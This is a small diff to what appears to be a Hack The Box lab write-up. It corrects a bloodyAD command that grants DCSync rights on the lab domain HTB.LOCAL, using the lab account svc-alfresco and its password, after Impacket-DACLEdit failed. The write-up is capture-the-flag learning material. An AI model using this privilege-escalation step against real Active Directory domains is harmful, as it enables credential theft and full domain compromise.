@@ -231,7 +231,7 @@ net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "HTB.LOCAL"/"SVC-ALFRESC
 I tried to use Impacket-DACLEdit to get DCSync Permissions, but I kept getting "host unreachable" no matter what I tried so I switched things up to BloodyAD.
 
 ```bash
-bloodyAD --host "$10.10.10.161" -d "HTB.LOCAL" -u "svc-alfresco" -p "s3rvice" add dcsync "exchange windows permissions" "svc-alfresco"
+bloodyAD --host "10.10.10.161" -d "HTB.LOCAL" -u "svc-alfresco" -p "s3rvice" add dcsync "exchange windows permissions" "svc-alfresco"
 ```
 
 ![](Assets/Pasted%20image%2020250722163144.png)
